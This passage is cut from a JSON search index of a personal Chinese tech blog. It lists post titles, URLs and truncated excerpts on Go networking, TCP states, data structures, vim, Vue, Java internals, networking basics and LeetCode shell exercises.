tcpHandler","lvl0":"06.构建一个tcp服务器代理","lvl1":null,"lvl2":"摘要","objectID":"c1f59a4a4976dce71589ed7c1b2984c9","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/06.%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AAtcp%E6%9C%8D%E5%8A%A1%E4%BB%A3%E7%90%86/"},{"content":"http编程 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 package main import ( \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;time\u0026#34; ) var ( Addr = \u0026#34;:1210\u0026#34; ) func main() { // 创建路由器 mux := http.NewServeMux() // 设置路由规","lvl0":"http编程","lvl1":null,"lvl2":"摘要","objectID":"fe84ece389fd0ceb28e426eb6f146bb0","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/02.http%E7%BC%96%E7%A8%8B/"},{"content":"为啥 time_wait 要等待 2MSL MSL: maximum segment lifetime, 30秒 \u0026ndash; 1分钟 保证 TCP协议全双工主动关闭 为啥会出现大量的close_wait 首先 close_wait 一般出现在 被动关闭方 并发请求太多导","lvl0":"time_wait和close_wait区别","lvl1":null,"lvl2":"摘要","objectID":"9eaabb0e2c24c18281f553f0a6bc7bad","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%81%9A%E9%A1%B9%E7%9B%AE/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%BD%91%E5%85%B3%E9%A1%B9%E7%9B%AE/01.time_wait%E5%92%8Cclose_wait/"},{"content":"AVL树算法实现 avl树算法资料收集 实现代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48","lvl0":"AVL树算法实现","lvl1":null,"lvl2":"摘要","objectID":"8d108f49d92847cd24f8e6763439a946","tags":["数据结构","AVL树"],"url":"https://lyr-2000.github.io/post/12.%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E5%B9%B3%E8%A1%A1%E6%A0%91/avl%E6%A0%91%E7%AE%97%E6%B3%95%E5%AE%9E%E7%8E%B0/"},{"content":"低代码解决方案调研 参考掘金博客-前端拖拽 https://github.com/CookGuo/vue-lowcode 右键菜单 可以参考的项目 smart-admin项目 低代码平台 收集 low code github收集","lvl0":"低代码解决方案调研","lvl1":null,"lvl2":"摘要","objectID":"30bbc7f701cd47742dde56710fd5722c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/%E6%96%B0%E6%8A%80%E6%9C%AF%E6%9D%82%E8%AE%B0/%E4%BD%8E%E4%BB%A3%E7%A0%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E8%B0%83%E7%A0%94/"},{"content":"服务治理 什么是服务治理 治理服务的哪些方面 服务定义 服务注册与发现 接口调用链 应用服务监控 负载均衡 服务降级熔断 服务调用协议 服务安全 服务版本","lvl0":"服务治理的概念","lvl1":null,"lvl2":"摘要","objectID":"13a18e6b93809770e3535f97210c0ecf","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/%E6%96%B0%E6%8A%80%E6%9C%AF%E6%9D%82%E8%AE%B0/%E6%9C%8D%E5%8A%A1%E6%B2%BB%E7%90%86%E7%9A%84%E6%A6%82%E5%BF%B5/"},{"content":"hadoop技术学习 hadoop常用端口 hadoop 3.x hdfs nameNode 内部通常端口： 8020/9000/9820 hdfs NameNode 对用户的查询端口： 9870 yarn查看任务运行的情况： 9088 历史服务器： 19888 hadoop 2.x hdfs namenode","lvl0":"hadoop","lvl1":null,"lvl2":"摘要","objectID":"2160066023a5dab1ca9dd7dc23613d4c","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/hadoop/hadoop/"},{"content":"golang 解析注释的方法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package data type U interface { A(i int) error } // 这个是实现类 // hello world /* sdfjljfalsjfa */ // X impl xxxx type X struct { } // a func func (a X) A(u int) error { return","lvl0":"golang解析注释的方法","lvl1":null,"lvl2":"摘要","objectID":"7a4e5bc1c8d56dd872aed22e4c7fa1a0","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/go-%E8%A7%A3%E6%9E%90%E6%B3%A8%E9%87%8A%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"content":"go generate 代码生成 参考学习教程 参考项目 sqlc 使用教程 不想用 orm，那只能写那种 比较原生的代码，这样就会特别的复杂，这里找到了一种解决方案 golang 注解 参考博客","lvl0":"golang generate","lvl1":null,"lvl2":"摘要","objectID":"e3283d7af632d9f5f0c2886ac8b915e3","tags":["golang"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/golang/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/go-generate/"},{"content":"kafaka学习教程 参考学习教程_打包 dockerfile","lvl0":"Kafka学习教程","lvl1":null,"lvl2":"摘要","objectID":"79c5cdf5bb254ebecf10b24083149e78","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%B7%A5%E5%85%B7/kafka/kafaka%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B/"},{"content":"vim 自定义合理的快捷键 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60","lvl0":"vim 自定义快捷键【原创】","lvl1":["vim"],"lvl2":"摘要","objectID":"16790074f0bba4608be8a54dec36e869","tags":["vim"],"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/vim/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%BF%AB%E6%8D%B7%E9%94%AE/"},{"content":"component组件学习 参考博客 component 组件学习 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;template\u0026gt; \u0026lt;!-- eslint-disable vue/require-component-is --\u0026gt; \u0026lt;component v-bind=\u0026#34;linkProps(to)\u0026#34;\u0026gt; \u0026lt;slot /\u0026gt; \u0026lt;/component\u0026gt; \u0026lt;/template\u0026gt; \u0026lt;script\u0026gt; import","lvl0":"基础语法学习【router-view】","lvl1":null,"lvl2":"摘要","objectID":"bddb8c2e798ba794a0d8c54f3abbaa35","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/vue/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/component/"},{"content":"action 学习 action 和 子模块定义 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60","lvl0":"基础语法学习【vuex action】","lvl1":null,"lvl2":"摘要","objectID":"765a5676f75e4ea1544bd0430489df53","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%AF%AD%E8%A8%80%E6%8A%80%E6%9C%AF/vue/%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/action/"},{"content":"vim 安装 golang插件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59","lvl0":"vim -安装 golang插件","lvl1":null,"lvl2":"摘要","objectID":"0ab72d9827066b939bfef29865955921","tags":null,"url":"https://lyr-2000.github.io/post/13.%E8%BD%AF%E4%BB%B6%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/vim/vim-go/"},{"content":"arp 协议原理 一、什么是ARP协议 ARP协议，全称“Address Resolution Protocol”,中文名是地址解析协议，使用ARP协议可实现通过IP地址获","lvl0":"arp协议原理","lvl1":null,"lvl2":"摘要","objectID":"36880c0e32cdabe7c7d944055ae9a46f","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/arp%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86/"},{"content":"1. web及网络基础 1.1. 通过HTTP访问web[C/S] 1.2. TCP/IP四层模型 1.2.1. 数据包的封装 1.3. TCP/IP协议族 1.3.1. 负责传输的IP协议 使用ARP协","lvl0":"http-basics","lvl1":null,"lvl2":"摘要","objectID":"1ae89460665ba135bd74cb290b2cdda0","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/http-basics/"},{"content":"4. HTTP状态码 状态码即服务器返回的请求结果。 状态码 类型 说明 1xx Informational(信息性状态码) 接收的请求正在处理 2xx Success(","lvl0":"http-code","lvl1":null,"lvl2":"摘要","objectID":"26c4401db2a2b3a3749bd8751a010223","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/http-code/"},{"content":"我们了解了 HTTP 报文的结构，知道一个 HTTP 报文是由“header+body”组成的。但那时我们主要研究的是 header，没有涉及到 body。所以，“","lvl0":"http实体数据","lvl1":null,"lvl2":"摘要","objectID":"a4b68d397b09a307a35c5a43cb488441","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/http%E5%AE%9E%E4%BD%93%E6%95%B0%E6%8D%AE/"},{"content":"重定向原理 后端 在 http header 中 加入 status_code ， 302 是临时重定向， 301 是永久重定向 response headers 中 有一个 location属性，这个 就是 我要跳转的新的地址 1 2 3 4 5 6 7 8 9 10","lvl0":"http重定向原理","lvl1":null,"lvl2":"摘要","objectID":"7d13cd092641d6643ca8bc17b9d23a8b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/http%E5%BA%94%E7%94%A8%E5%B1%82/%E9%87%8D%E5%AE%9A%E5%90%91%E5%8E%9F%E7%90%86/"},{"content":"1. IP基础 TCP/IP的心脏是互联网层，这一层主要有IP和ICMP两个协议组成，在OSI参考模型中为第三层（网络层）。网络层的主要作用是实现","lvl0":"ip","lvl1":null,"lvl2":"摘要","objectID":"d9019ed025b3fc8c0b5d7464018bc237","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/ip/"},{"content":"TCP/IP 网络分层模型 还是先从 TCP/IP 协议开始讲起，一是因为它非常经典，二是因为它是目前事实上的网络通信标准，研究它的实用价值最大。 TCP/IP 当初的设计者真的是非","lvl0":"tcp 和 ip 分层","lvl1":null,"lvl2":"摘要","objectID":"98ffe04df79608a8b72b5921279b1902","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcp-ip%E5%88%86%E5%B1%82/"},{"content":"1. 基础知识 1.1. 协议 计算机与网络设备要相互通信，必须基于相同的方法。比如，如何探测到通信目标，使用哪种语言通信，如何结束通信等规则要事先确定。 不","lvl0":"tcp-basics","lvl1":null,"lvl2":"摘要","objectID":"64e39b2dd92dee344e0850cccffc5c49","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/tcpip-basics/"},{"content":"3. HTTP报文 3.1. HTTP报文 用于HTTP协议交互的信息被称为HTTP报文，客户端的HTTP报文叫做请求报文，服务端的叫做响应报文。报文大致分","lvl0":"tcp-message","lvl1":null,"lvl2":"摘要","objectID":"7a383dad4ed45ea6ad0c55907a52a284","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/http-message/"},{"content":"1. 传输层的作用 1.1. 传输层的定义 IP首部有个协议字段，用来标识传输层协议，识别数据是TCP的内容还是UDP的内容。同样，传输层，为了识别数据应该","lvl0":"tcp/udp","lvl1":null,"lvl2":"摘要","objectID":"2b2d272d71def43041b7d26b572eba53","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/tcpip/tcp-udp/"},{"content":"宽带原理 网速概念 1byte = 8Bit 100M 的宽带理论下载速度是 12.5M/s 4M 的宽带理论下载速度是 512kb/s 这个 兆 是指 Bit ，是100M bit ， 不是100M 字节，所以，要除于8 比如 1M 的宽","lvl0":"电脑_宽带原理","lvl1":null,"lvl2":"摘要","objectID":"8106538a096fe43616552c5587e69b43","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%94%B5%E8%84%91_%E5%AE%BD%E5%B8%A6/"},{"content":"内存条 内存条基本原理","lvl0":"电脑_内存条","lvl1":null,"lvl2":"摘要","objectID":"0bbb72cb1a675a5494beefbdb7fff382","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%94%B5%E8%84%91_%E5%86%85%E5%AD%98%E6%9D%A1/"},{"content":"显卡的原理 显卡是游戏最重要的配置，主板，CPU性能可以低一点点，但是显卡达不到游戏的最低配置也没办法玩游戏 显卡生厂商 英伟达(navidia)","lvl0":"电脑_显卡","lvl1":null,"lvl2":"摘要","objectID":"894117d9004555d8032dbbc8e17eb559","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%94%B5%E8%84%91_%E6%98%BE%E5%8D%A1/"},{"content":"作者：peonyX 链接：https://www.nowcoder.com/discuss/723383?source_id=profile_","lvl0":"计算机网络八股文","lvl1":null,"lvl2":"摘要","objectID":"6310dc2f644fc49d4569946b676bd093","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%85%AB%E8%82%A1%E6%96%87/"},{"content":"协议三要素 当然，这种协议还是更接近人类语言，机器不能直接读懂，需要进行翻译，翻译的工作教给编译器，也就是程序员常说的 compile。这个过程","lvl0":"网络协议_","lvl1":null,"lvl2":"摘要","objectID":"b92e39eae908e0c5d32f7906b9c13e0e","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE_/"},{"content":"一个长度为 n−1 的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围 $0 $ 到 $ n−1 $ 之内。 在范围 0 到 n−1 的 n 个数字中有且只有一个数字","lvl0":"0到n-1中缺失的数字","lvl1":null,"lvl2":"摘要","objectID":"375ca2d480848aeb1e2910d2a0320657","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%89%91%E6%8C%87offer/%E4%BA%8C%E5%88%86or%E6%9F%A5%E6%89%BE/0%E5%88%B0n-1%E4%B8%AD%E7%BC%BA%E5%A4%B1%E7%9A%84%E6%95%B0%E5%AD%97/"},{"content":"JAVA 语言基础 StringBuilder buffer ,String 区别 线程安全 string不可变 final 修饰，线程安全 buffer 安全 ，用了 syncrhonized 同步 ，可变字符串 builder 没有锁，不安全 可变 string 是 底层用了个 final 的 char 数组，不","lvl0":"1.语言基础","lvl1":["八股文"],"lvl2":"摘要","objectID":"899622bed64e935d412a62adf0178826","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/1.%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"content":"192. 统计词频 Difficulty: 中等 写一个 bash 脚本以统计一个文本文件 words.txt 中每个单词出现的频率。 为了简单起见，你可以假设： words.txt只包括小写字母和 ' ' 。 每个","lvl0":"192.统计词语频率","lvl1":["linux"],"lvl2":"摘要","objectID":"a647531a9723ceff3c414b5b786817d5","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/leetcode-shell%E8%AF%AD%E6%B3%95%E5%88%B7%E9%A2%98/192.%E7%BB%9F%E8%AE%A1%E8%AF%8D%E9%A2%91/"},{"content":"193. 有效电话号码 Difficulty: 简单 给定一个包含电话号码列表（一行一个电话号码）的文本文件 file.txt，写一个单行 bash 脚本输出所有有效的电话号码。 你可以假","lvl0":"193. 有效电话","lvl1":["linux"],"lvl2":"摘要","objectID":"ba7b20c238de935e49f7a15804856fc9","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/leetcode-shell%E8%AF%AD%E6%B3%95%E5%88%B7%E9%A2%98/193.%E6%9C%89%E6%95%88%E7%94%B5%E8%AF%9D/"},{"content":"194. 转置文件 Difficulty: 中等 给定一个文件 file.txt，转置它的内容。 你可以假设每行列数相同，并且每个字段由 ' ' 分隔。 示例： 假设 file.txt 文件内容如下： 1 2 3","lvl0":"194.转置文件","lvl1":["linux"],"lvl2":"摘要","objectID":"7caae94ae6409c54c7ce0b21fe9b98f8","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/leetcode-shell%E8%AF%AD%E6%B3%95%E5%88%B7%E9%A2%98/%E8%BD%AC%E7%BD%AE%E6%96%87%E4%BB%B6%E8%A1%8C%E8%BD%AC%E5%88%97/"},{"content":"195. 第十行 Difficulty: 简单 给定一个文本文件 file.txt，请只打印这个文件中的第十行。 示例: 假设 file.txt 有如下内容： 1 2 3 4 5 6 7 8 9 10 Line 1 Line 2 Line 3 Line 4 Line 5","lvl0":"195.第十行","lvl1":["linux"],"lvl2":"摘要","objectID":"c0d27996bae8244b620fe43ef14fb73e","tags":["linux"],"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/leetcode-shell%E8%AF%AD%E6%B3%95%E5%88%B7%E9%A2%98/%E7%AC%AC10%E8%A1%8C/"},{"content":"内存布局 常见的垃圾回收算法 GC 的一些名词 Minor GC 新生代空间，eden,survivor 区域回收的叫做minor GC Major GC 清理Tenured区， 用于回收","lvl0":"2.java gc 垃圾回收机制","lvl1":null,"lvl2":"摘要","objectID":"87a4882f03380ae65cc44646d14f8fbc","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/2.java-gc/"},{"content":"重新 equals 一定要重新 hashCode 并发编程三要素 原子性，不可分割 有序性， 程序执行顺序和代码顺序保持一致 可见性【可用性】， 一个线程对共享变量的修改，另一个线程","lvl0":"3.java语言八股","lvl1":null,"lvl2":"摘要","objectID":"a4adfb135417bca38f3402da760a0b2d","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/3.java%E8%AF%AD%E8%A8%80%E5%85%AB%E8%82%A1/"},{"content":"jvm加载类的过程 一句话解释清楚整个过程 先加载 class 进内存 对 class信息内容进行语法校验，判断是否有错误 对静态变量初始化 调用构造器 初始化实例 加","lvl0":"4.JVM 加载类的方式，内存分布","lvl1":null,"lvl2":"摘要","objectID":"e09fd417a708b20e643634d4bcec5078","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/4.jvm%E5%8A%A0%E8%BD%BD%E7%B1%BB/"},{"content":"4399挂经总结 非常总要的部分 【ip知识点】 计算IP 的5连问 IP 计算总结 ip 可以用一个 32位的整数来存储 计算公式： 多少个0 ，就是 2的多少次方， 比","lvl0":"4399挂经","lvl1":null,"lvl2":"摘要","objectID":"2bdd37a94fd65c9d53cae87677f6fcc5","tags":["选择题刷题笔记","做题家速成"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E7%AC%94%E8%AF%95%E9%A2%98%E9%9D%A2%E7%BB%8F%E6%8C%82%E7%BB%8F/%E7%AC%94%E8%AF%95%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/4399%E7%AC%94%E8%AF%95%E6%80%BB%E7%BB%93%E6%8C%82%E7%BB%8F/"},{"content":"hashMap JDK 1.7 jdk1.7 hashMap put 位运算公式 $index = h\u0026amp;(array.length-1)$ array.length 是 2的幂的时候， 相当于 $index=h % array.length$ 默认容量为 16 【初始化】 面试宝典 视频 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24","lvl0":"5.集合相关问题","lvl1":["八股文"],"lvl2":"摘要","objectID":"db8437d8eb8289796c2bccbade4e6037","tags":["八股文"],"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E5%85%AB%E8%82%A1%E6%96%87%E4%B8%93%E9%A2%98%E9%9D%A2%E8%AF%95%E5%85%AB%E8%82%A1%E6%96%87/java%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/5.%E9%9B%86%E5%90%88%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"},{"content":"Kafka如何实现高性能IO？ 总结 批量消息提升服务器处理能力【buffer缓存】 使用批量消息提升服务端处理能力 我们知道，批量处理是一种非常有","lvl0":"apache_kafaka原理","lvl1":["消息队列"],"lvl2":"摘要","objectID":"819edb4992c4bfb0e1fb526dbb64f937","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/%E4%B8%AD%E9%97%B4%E4%BB%B6/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/apache_kafaka%E9%AB%98%E6%80%A7%E8%83%BDio%E5%8E%9F%E7%90%86/"},{"content":"AQS 实现原理 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 static final class Node { // waitStatus值 static final int CANCELLED = 1; static final int SIGNAL = -1; static final int CONDITION = -2; static final int PROPAGATE = -3; // 节点的状","lvl0":"AQS源码问题","lvl1":null,"lvl2":"摘要","objectID":"c211b11a527cc9d3ca8d9d298264dd1b","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/aqs%E6%BA%90%E7%A0%81%E9%97%AE%E9%A2%98/"},{"content":"ip 用 int 表示，4个字节，mac 地址记住是 6个字节 看这个图，我们要记住，只要是 6个字节的，字节说是 MAC 地址 看这个图，如果类型是： 0800 -\u0026gt; ip数据包 0806 -\u0026gt;","lvl0":"arp协议等原理","lvl1":null,"lvl2":"摘要","objectID":"dc6138da9e8e7f057cc05f7c15f7a432","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/linux/linux%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86%E6%9D%82%E8%AE%B0/cpp%E8%AF%AD%E8%A8%80%E4%BD%BF%E7%94%A8/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/arp%E5%8D%8F%E8%AE%AE%E5%8E%9F%E7%90%86%E7%AD%89/"},{"content":"balking 模式理解 我们提到可以用“多线程版本的 if”来理解 Guarded Suspension 模式，不同于单线程中的 if，这个“多线程版本的 if”是需要等待的，而且还很执着，必须要","lvl0":"balking模式","lvl1":null,"lvl2":"摘要","objectID":"7f63e2554d4c0f5727ac398886746923","tags":null,"url":"https://lyr-2000.github.io/post/11.%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/java/java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/balking%E6%A8%A1%E5%BC%8F/"},{"content":"bash基础 安装man命令行 1 2 3 